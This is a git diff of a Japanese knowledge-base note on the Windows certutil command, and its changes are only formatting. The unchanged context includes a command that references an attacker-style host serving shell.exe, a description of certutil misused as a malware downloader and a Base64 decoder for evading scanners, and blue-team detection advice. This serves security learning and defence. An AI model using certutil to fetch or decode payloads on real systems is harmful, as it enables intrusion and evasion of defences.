@@ -1,17 +1,17 @@
 ---
 # --- YAML Frontmatter ---
-created: '2026-02-22'
-modified: '2026-02-22'
+created: 2026-02-22 14:53
+modified: 2026-02-22 15:13
 environment: [OS/Windows]
 vulnearability: [File_Download, Obfuscation, Information_Disclosure]
 knowledge_category: Command
 tags:
-  - 'certutil'
+  - certutil
   - cmd
-  - 'lolbas'
-  - 'file_integrity'
-  - 'cryptography'
-  - 'knowledge_base'
+  - lolbas
+  - file_integrity
+  - cryptography
+  - knowledge_base
 ---
 
 # Command - Windows - cmd - certutil - 証明書サービスと各種ファイル操作
@@ -19,10 +19,10 @@ tags:
 ## 概要
 
 `certutil` は、Windows の証明書サービス（Certificate Services）の一部としてインストールされるコマンドライン プログラムです。
+
 証明書、CA (認証局) の構成情報の表示、証明書コンポーネントのバックアップと復元など、本来は公開鍵基盤 (PKI) の管理を目的としていますが、ハッシュ計算やファイル転送などの付加機能が強力なため、汎用的なユーティリティとして広く利用されています。
+
 (出自: Windows標準搭載)
-
-
 
 ## 類似コマンドと差異
 
@@ -44,7 +44,6 @@ tags:
     REM インストーラーのSHA256ハッシュを表示
     certutil -hashfile setup.exe SHA256
     ```
-
 
 ## スイッチ/オプション説明
 
@@ -96,7 +95,6 @@ tags:
     certutil -urlcache -split -f [http://10.10.14.5/shell.exe](http://10.10.14.5/shell.exe) delete
     ```
 
-
 ## エラーメッセージとトラブルシューティング
 
 ### よくあるトラブル
@@ -117,7 +115,7 @@ tags:
 
 ### 脆弱性と悪用事例
 
-* **悪用シナリオ**: 
+* **悪用シナリオ**:
     - **Downloader**: 標準コマンドであるため、外部からのマルウェアダウンロードに頻繁に悪用されます。
     - **Obfuscation**: `decode` 機能を使って、セキュリティ製品のスキャンを回避するために Base64 化された不正コードを復元する。
 
@@ -129,9 +127,9 @@ tags:
 
 ### 対応策・緩和策 (ブルーチーム視点)
 
-* **Prevention (予防)**: 
+* **Prevention (予防)**:
     - 不要なサーバーでの `certutil` による外部通信をファイアウォールで遮断する。
-* **Detection (検知)**: 
+* **Detection (検知)**:
     - **イベントID 4688**: `certutil` の実行を監視。特に `-urlcache` や `-decode` スイッチを含むコマンドライン引数はアラート対象とする。
     - **ネットワーク監視**: `certutil.exe` プロセスによる外部 HTTP/HTTPS 通信を検知。
 
